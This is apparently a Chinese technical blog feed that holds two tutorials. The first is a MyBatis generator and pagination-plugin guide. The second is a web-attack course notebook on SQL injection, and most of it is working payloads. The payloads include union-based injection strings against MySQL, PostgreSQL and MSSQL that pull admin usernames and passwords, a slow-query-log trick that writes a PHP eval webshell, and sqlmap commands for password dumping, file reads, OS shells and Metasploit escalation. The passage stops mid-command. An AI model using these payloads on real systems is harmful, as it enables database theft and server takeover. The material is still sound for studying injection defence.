--&gt;</span><br>        <span class="hljs-comment">&lt;!-- tableName设置为*号，可以对应所有表，此时不写domainObjectName --&gt;</span><br>        <span class="hljs-comment">&lt;!-- domainObjectName属性指定生成出来的实体类的类名 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">tableName</span>=<span class="hljs-string">&quot;t_emp&quot;</span> <span class="hljs-attr">domainObjectName</span>=<span class="hljs-string">&quot;Emp&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">tableName</span>=<span class="hljs-string">&quot;t_dept&quot;</span> <span class="hljs-attr">domainObjectName</span>=<span class="hljs-string">&quot;Dept&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">generatorConfiguration</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="4"><li class="lvl-3"><p>执行MGB插件的Generate目标</p></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1676290981156-f68f08a2-7ce7-4d19-bb82-f0a89545d414.png#averageHue=%2388916d&amp;clientId=u22e5d235-24e2-4&amp;from=paste&amp;height=423&amp;id=uc578f91b&amp;name=image.png&amp;originHeight=529&amp;originWidth=954&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=68578&amp;status=done&amp;style=none&amp;taskId=uf8632bb7-f4a7-49e6-9883-26b38db7ff9&amp;title=&amp;width=763.2" alt="image.png"></p><ol start="5"><li class="lvl-3"><p>over</p></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1676291149151-251b1977-f0a9-4011-9ca6-d1ee950effb5.png#averageHue=%238c9d76&amp;clientId=u22e5d235-24e2-4&amp;from=paste&amp;height=813&amp;id=u42617b4f&amp;name=image.png&amp;originHeight=1016&amp;originWidth=1906&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=196696&amp;status=done&amp;style=none&amp;taskId=uc569154d-66ac-4105-9914-5b8555047b0&amp;title=&amp;width=1524.8" alt="image.png"></p><h3 id="11-2-QBC查询">11.2 QBC查询</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testMBG</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(<span class="hljs-string">&quot;mybatis-config.xml&quot;</span>);<br>        <span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>().build(is);<br>        <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">EmpMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(EmpMapper.class);<br>        <span class="hljs-comment">//查询所有数据</span><br>        <span class="hljs-comment">/*List&lt;Emp&gt; list = mapper.selectByExample(null);</span><br><span class="hljs-comment">        list.forEach(emp -&gt; System.out.println(emp));*/</span><br>        <span class="hljs-comment">//根据条件查询</span><br>        <span class="hljs-comment">/*EmpExample example = new EmpExample();</span><br><span class="hljs-comment">            example.createCriteria().andEmpNameEqualTo(&quot;张</span><br><span class="hljs-comment">        三&quot;).andAgeGreaterThanOrEqualTo(20);</span><br><span class="hljs-comment">        example.or().andDidIsNotNull();</span><br><span class="hljs-comment">        List&lt;Emp&gt; list = mapper.selectByExample(example);</span><br><span class="hljs-comment">        list.forEach(emp -&gt; System.out.println(emp));*/</span><br>        mapper.updateByPrimaryKeySelective(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Emp</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-number">22</span>,<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;456@qq.com&quot;</span>,<span class="hljs-number">3</span>));<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-3-总结">11.3 总结</h3><div class="info"><p>无</p></div><h2 id="12-分页插件">12. 分页插件</h2><p>limit index,pageSize<br>pageSize：每页显示的条数<br>pageNum：当前页的页码<br>index：当前页的起始索引，index=(pageNum-1)*pageSize<br>count：总记录数<br>totalPage：总页数<br>totalPage = count / pageSize;<br>if(count % pageSize != 0){<br>totalPage += 1;<br>}<br>pageSize=4，pageNum=1，index=0 limit 0,4<br>pageSize=4，pageNum=3，index=8 limit 8,4<br>pageSize=4，pageNum=6，index=20 limit 8,4</p><p>首页 上一页 2 3 4 5 6 下一页 末页</p><h3 id="12-1-分页插件的流程">12.1 分页插件的流程</h3><ol><li class="lvl-3"><p>添加依赖</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>&lt;/dependency<br></code></pre></td></tr></table></figure><ol start="2"><li class="lvl-3"><p>配置分页插件</p></li></ol><p>在MyBatis的核心配置文件中配置插件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--设置分页插件--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">interceptor</span>=<span class="hljs-string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="12-2-分页插件的使用">12.2 分页插件的使用</h3><ol><li class="lvl-3"><p>在查询功能之前使用PageHelper.startPage(int pageNum, int pageSize)开启分页功能</p></li></ol><blockquote><p>pageNum：当前页的页码<br>pageSize：每页显示的条数</p></blockquote><ol start="2"><li class="lvl-3"><p>在查询获取list集合之后，使用PageInfo<T> pageInfo = new PageInfo&lt;&gt;(List<T> list, int navigatePages)获取分页相关数据</T></T></p></li></ol><blockquote><p>list：分页之后的数据<br>navigatePages：导航分页的页码数</p></blockquote><ol start="3"><li class="lvl-3"><p>分页相关数据</p></li></ol><blockquote><p>PageInfo{<br>pageNum=8, pageSize=4, size=2, startRow=29, endRow=30, total=30, pages=8,<br>list=Page{count=true, pageNum=8, pageSize=4, startRow=28, endRow=32, total=30,<br>pages=8, reasonable=false, pageSizeZero=false},<br>prePage=7, nextPage=0, isFirstPage=false, isLastPage=true, hasPreviousPage=true,<br>hasNextPage=false, navigatePages=5, navigateFirstPage4, navigateLastPage8,<br>navigatepageNums=[4, 5, 6, 7, 8]<br>}<br>pageNum：当前页的页码<br>pageSize：每页显示的条数<br>size：当前页显示的真实条数<br>total：总记录数<br>pages：总页数<br>prePage：上一页的页码<br>nextPage：下一页的页码<br>isFirstPage/isLastPage：是否为第一页/最后一页<br>hasPreviousPage/hasNextPage：是否存在上一页/下一页<br>navigatePages：导航分页的页码数<br>navigatepageNums：导航分页的页码，[1,2,3,4,5]</p></blockquote><h3 id="12-3-总结">12.3 总结</h3><div class="info"><p>无</p></div><p><a href="https://www.yuque.com/attachments/yuque/0/2023/pdf/12889352/1676288103594-a763ee89-c157-462d-aef5-fa3ef31db333.pdf?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2023%2Fpdf%2F12889352%2F1676288103594-a763ee89-c157-462d-aef5-fa3ef31db333.pdf%22%2C%22name%22%3A%22mybatis-3.5.7.pdf%22%2C%22size%22%3A269386%2C%22ext%22%3A%22pdf%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u42c8cca9-4f6f-471f-ae4e-56051414ba1%22%2C%22taskType%22%3A%22upload%22%2C%22type%22%3A%22application%2Fpdf%22%2C%22__spacing%22%3A%22both%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22u86fb061a%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D">mybatis-3.5.7.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Mybatis</tag>
      
      <tag>JavaEE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.WEB攻防-SQL注入</title>
    <link href="/2023/01/01/5.WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/01/5.WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="1-MySQL-一-跨库-Access偏移">1. MySQL(一)跨库&amp;Access偏移</h2><h3 id="1-1-知识点：">1.1 知识点：</h3><ul class="lvl-0"><li class="lvl-2">脚本代码与数据库前置知识<ul class="lvl-2"><li class="lvl-5">select 字段 from 表名 where 字段=条件;</li><li class="lvl-5">mysql5.0以后才有information_scheam数据库, 以前只能暴力破解</li></ul></li><li class="lvl-2">Access数据库注入-简易&amp;偏移<ul class="lvl-2"><li class="lvl-5">Access 只有一个用户, 无高权限注入点, 只能猜解, 暴力破解</li></ul></li><li class="lvl-2">MYSQL数据库注入-简易&amp;权限跨库</li></ul><p>漏洞产生根本条件：可控变量 特定函数</p><h3 id="1-2-前置知识：">1.2 前置知识：</h3><h4 id="SQL注入漏洞产生原理分析">SQL注入漏洞产生原理分析</h4><p><strong>开发者没有在网页传参点做好过滤，导致非法参数拼接到sql语句中, 数据库进行执行产生了不合法操作</strong></p><p>脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。</p><h4 id="SQL注入漏洞危害利用分析">SQL注入漏洞危害利用分析</h4><p>管理员密码泄露, 后门文件写入, 数据泄露, 服务器权限</p><h4 id="脚本代码与数据库操作流程">脚本代码与数据库操作流程</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">url: http:<span class="hljs-comment">//192.168.100.10/index.php?id=1</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/config/conn.php&quot;</span>);<br><span class="hljs-variable">$i</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment">//GET请求接受id参数名值给变量i</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from bees_article where id=<span class="hljs-subst">$i</span>&quot;</span>;<br><span class="hljs-comment">// 通过url访问传入id参数, 并拼接到sql语句中</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure><h4 id="数据库名，表名，列名，数据">数据库名，表名，列名，数据</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/12889352/1662717227083-88dfa034-bde3-40d7-a1bd-c664d663e8d7.jpeg" alt="image.png"></p><h4 id="数据库类型，数据库用户，用户权限">数据库类型，数据库用户，用户权限</h4><p>Access是独立存在的, 一个网站就这一个数据库文件<br>MySQL是统一管理的, 里面不光当前网站的数据库, 还可能存在其他网站数据库<br>MySQL用户:</p><ul class="lvl-0"><li class="lvl-2"><p>最高权限root: 可进行跨库注入, 文件读写操作</p></li><li class="lvl-2"><p>其他用户: 只能渗透本库, 常规猜解内容</p></li></ul><h3 id="1-3-演示案例">1.3 演示案例</h3><ul class="lvl-0"><li class="lvl-2"><p>SQL注入一般性猜解注入步骤</p><ul class="lvl-2"><li class="lvl-5">?id=1 order by 4 猜有几个字段</li><li class="lvl-5">?id=1 union 1,2,3,4 看那个字段会在页面回显</li><li class="lvl-5">?id=1 union 1,2,user(),4 根据回显字段获取: 用户名user(), 版本version(), 系统@@version_complie_os, 数据库名database()</li></ul></li><li class="lvl-2"><p>ASP+Access-简易注入-字典猜解</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662718788503-ac2fbc8e-efa0-4703-ab35-93eea0ef3036.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662718924527-2b2de41f-da0c-480e-a199-007db07d2762.png#averageHue=%23f4f2f1&amp;clientId=uea2bfe15-a416-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=408&amp;id=ufeba685e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=408&amp;originWidth=903&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=69046&amp;status=done&amp;style=none&amp;taskId=ue140b7c4-984f-46f2-925e-dd4779b46fe&amp;title=&amp;width=903" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719520316-dd31edbb-3093-4e2d-8b72-850bb4135101.png#averageHue=%23f7f6f5&amp;clientId=uea2bfe15-a416-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=439&amp;id=u4147be67&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=439&amp;originWidth=1357&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=62940&amp;status=done&amp;style=none&amp;taskId=u13175fb7-3f16-4f88-b79e-4bf3a75de11&amp;title=&amp;width=1357" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719607872-2e5437ae-7133-41df-9fde-bb3b191b3c65.png#averageHue=%23f7f6f5&amp;clientId=uea2bfe15-a416-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=496&amp;id=u08ad30bc&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=496&amp;originWidth=1446&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=85647&amp;status=done&amp;style=none&amp;taskId=u8b507126-79c4-44f6-b4e5-7c964d7c389&amp;title=&amp;width=1446" alt="image.png"></p><ul class="lvl-0"><li class="lvl-2"><p>ASP+Access-偏移注入-报错显示</p></li></ul><blockquote><p>用于只知道表名, 不知道字段名的情况下</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>PHP+MYSQL-跨库注入-权限属性</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719865263-ca186261-67e6-49cd-9add-64065e8cfed2.png#averageHue=%23f4d8d6&amp;clientId=uea2bfe15-a416-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=413&amp;id=u80b7e053&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=413&amp;originWidth=947&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=62977&amp;status=done&amp;style=none&amp;taskId=ue0f98e40-459a-42e6-b5af-2f827e48dda&amp;title=&amp;width=947" alt="image.png"></p><blockquote><h2 id="获取数据库名-判断用户">获取数据库名, 判断用户</h2><p>127.0.0.1/blog1/news.php?id=1 union select user(),database()</p><h2 id="获取管理员表名">获取管理员表名</h2><p>127.0.0.1/blog1/news.php?id=1 union select table_schema, table_name from information_schema.tables where table_schema=“beescms”</p><h2 id="获取管理员表中的字段">获取管理员表中的字段</h2><p>127.0.0.1/blog1/news.php?id=1 union select table_name, column_name from information_schema.columns where table_schema=“beescms” and table_name=“bees_admin”</p><h2 id="获取字段信息">获取字段信息</h2><p>127.0.0.1/blog1/news.php?id=1 union select admin_name,admin_password from beescms.bees_admin</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662720664222-28869943-23c5-4008-8f45-c1eb16e25413.png#averageHue=%23f6f5f4&amp;clientId=uea2bfe15-a416-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=480&amp;id=u6d71118f&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=480&amp;originWidth=1275&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=72099&amp;status=done&amp;style=none&amp;taskId=ue5e29058-fba3-4f10-ac57-f2bd8cbb352&amp;title=&amp;width=1275" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662721144974-186d7790-7391-4e66-8568-3bb342877fc0.png#averageHue=%23f9e8e7&amp;clientId=uea2bfe15-a416-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=509&amp;id=u81a69782&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=1238&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=46049&amp;status=done&amp;style=none&amp;taskId=u3f8945d3-2aad-419b-ac86-f6ccef36b30&amp;title=&amp;width=1238" alt="image.png"></p><h3 id="1-4-补充Burpsuite-加密暴力破击">1.4 补充Burpsuite 加密暴力破击</h3><h2 id="2-MySQL-二-MSSQL-SQLServer-PostgreSQL">2. MySQL(二)&amp;MSSQL(SQLServer)&amp;PostgreSQL</h2><h3 id="2-1-知识点：">2.1 知识点：</h3><p>1、SQL注入-MYSQL数据库<br>select load_file(“d:/1.txt”) 读取文件<br>select “xxxxx” into outfile “d:/1.txt” 写入文件当文件存在, 读取不到内容的时候, 可能是secure_file_prive没有设置为空<br>show variables like “secure_file_priv”;  查询值<br><strong>在my.ini 文件 [mysqld]这个选项下</strong>加入变量声明：secure_file_priv=‘’</p><table><thead><tr><th><strong>secure_file_priv值</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>NULL</td><td>禁止文件的导入导出</td></tr><tr><td>‘’</td><td>（空字符串）允许所有文件的导入导出</td></tr><tr><td>一个特定的路径地址</td><td>只有该路径地址下的文件可以导入导出到mysql</td></tr></tbody></table><p>2、SQL注入-MSSQL数据库</p><p>3、SQL注入-PostgreSQL数据库<br><a href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a><br>4、读取文件时路径怎么来?</p><blockquote><p><strong>报错, phpinfo,字典</strong></p></blockquote><h3 id="2-2-演示案例：">2.2 演示案例：</h3><ul class="lvl-0"><li class="lvl-2"><p>MYSQL-root高权限读写注入</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">无法写入：secure_file_priv突破 注入中需要支持SQL执行环境，<br>没有就需要借助phpmyadmin或能够直接连上对方数据库进行绕过, <br>思路1通过日志写入后门代码:<br><span class="hljs-built_in">set</span> global slow_query_log=1;<br><span class="hljs-built_in">set</span> global slow_query_log_file=<span class="hljs-string">&#x27;shell路径&#x27;</span>;<br>select <span class="hljs-string">&#x27;&lt;?php eval($_GET[A])?&gt;&#x27;</span> or <span class="hljs-built_in">sleep</span>(11);<br></code></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>PostgreSQL-高权限读写注入</p></li></ul><blockquote><ol><li class="lvl-3"><p>测试列数方式为null填充</p></li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">-测列数：<br>order by 4<br>and 1=2 union select null,null,null,null<br>-测显位：第2，3<br>and 1=2 union select <span class="hljs-string">&#x27;null&#x27;</span>,null,null,null 错误<br>and 1=2 union select null,<span class="hljs-string">&#x27;null&#x27;</span>,null,null 正常<br>and 1=2 union select null,null,<span class="hljs-string">&#x27;null&#x27;</span>,null 正常<br>and 1=2 union select null,null,null,<span class="hljs-string">&#x27;null&#x27;</span> 错误<br>-获取信息：<br>and 1=2 UNION SELECT null,version(),null,null<br>and 1=2 UNION SELECT null,current_user,null,null<br>and 1=2 union select null,current_database(),null,null<br>-获取数据库名：<br>and1=2 union select null,string_agg(datname,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from pg_database<br>-获取表名：<br>1、and1=2 union select null,string_agg(tablename,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from pg_tables <span class="hljs-built_in">where</span> schemaname=<span class="hljs-string">&#x27;public&#x27;</span><br>2、and1=2 union select null,string_agg(relname,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from pg_stat_user_tables<br>-获取列名：<br>and1=2 union select null,string_agg(column_name,<span class="hljs-string">&#x27;,&#x27;</span>),null,null from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;reg_users&#x27;</span><br>-获取数据：<br>and1=2 union select null,string_agg(name,<span class="hljs-string">&#x27;,&#x27;</span>),string_agg(password,<span class="hljs-string">&#x27;,&#x27;</span>),null from reg_users<br>-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：<br>and1=2 union select null,string_agg(usename,<span class="hljs-string">&#x27;,&#x27;</span>),null,nullFROM pg_user WHERE usesuper ISTRUE<br>参考：<br></code></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>MSSQL-sa高权限读写执行注入</p></li></ul><blockquote><ol><li class="lvl-3"><p>测试列数方式为null填充</p></li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">-测列数：<br>order by 4<br>and1=2 union all select null,null,null,null<br>-测显位：<br>and1=2 union all select null,1,null,null<br>and1=2 union all select null,null,<span class="hljs-string">&#x27;s&#x27;</span>,null<br>-获取信息：<br>@@version 获取版本信息<br>db_name() 当前数据库名字<br>user、system_user,current_user,user_name 获取当前用户名<br>@@SERVERNAME 获取服务器主机信息<br>and1=2 union all select null,db_name(),null,null<br>-获取表名：<br>and1=2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects <span class="hljs-built_in">where</span> xtype=<span class="hljs-string">&#x27;u&#x27;</span>),null,null<br>union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects <span class="hljs-built_in">where</span> xtype=<span class="hljs-string">&#x27;u&#x27;</span>and name not <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;manage&#x27;</span>)),null,null<br>-获取列名：<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),1) from sysobjects),null,null<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),2) from sysobjects),null,null<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),3) from sysobjects),null,null<br>and1=2 union all select null,(select top 1col_name(object_id(<span class="hljs-string">&#x27;manage&#x27;</span>),4) from sysobjects),null,null<br>-获取数据：<br>and1=2 union all select null,username, password ,null from manage<br></code></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>结尾彩蛋-某Q牌违法登陆框注入</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">实战注入思路:<br>1. 寻找注入点.<br>2. 分析网站架构, 什么语言搭建, 数据库是什么类型.<br>3. 根据数据库类型获取相关数据, 是否为高权限用户.<br>4. 是否能获取到服务器权限.<br></code></pre></td></tr></table></figure><h2 id="3-Sqlmap-Oracle-Mongodb-DB2">3. Sqlmap&amp;Oracle&amp;Mongodb&amp;DB2</h2><hr><h3 id="3-1-知识点：">3.1 知识点：</h3><p>1、数据库注入-Oracle&amp;Mongodb<br>2、数据库注入-DB2&amp;SQLite&amp;Sybase<br>3、SQL注入神器-SQLMAP安装使用拓展</p><h3 id="3-2-SQLMAP">3.2 SQLMAP</h3><ul class="lvl-0"><li class="lvl-2"><p><strong>什么是SQLMAP？</strong></p></li></ul><p>能检测网站是否存在注入并利用注入点</p><ul class="lvl-0"><li class="lvl-2"><p><strong>它支持那些数据库注入？</strong></p></li></ul><p>市面上%99的都支持, nosql不支持</p><ul class="lvl-0"><li class="lvl-2"><p><strong>它支持那些SQL注入模式？</strong></p></li></ul><p>布尔盲注, 时间盲注, 错误注入, union查询, 堆叠注入, 带外DNSlog</p><ul class="lvl-0"><li class="lvl-2"><p><strong>它支持那些其他不一样功能？</strong></p></li></ul><p>支持代理注入, tamper脚本</p><ul class="lvl-0"><li class="lvl-2"><p><strong>使用SQLMAP一般注入流程分析？</strong></p></li></ul><p>1.判断出注入点 2.什么数据库的注入点 3. 是低权限还是高权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">常用语句 :<br>1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --<span class="hljs-built_in">users</span> --passwords --dbs -v 0 <br>2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 <br>3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T <span class="hljs-built_in">users</span> -C username -D userdb --start 2 --stop 3 -v 2 <br>4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C <span class="hljs-string">&quot;user,pass&quot;</span> -v 1 --exclude-sysdbs <br>5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 <br>6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read <span class="hljs-string">&quot;c:\boot.ini&quot;</span> -v 2 <br>7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 <br>8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd <span class="hljs-string">&quot;id&quot;</span> -v 1 <br>9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 <br>10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 <br>11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 <br>12./sqlmap.py -u 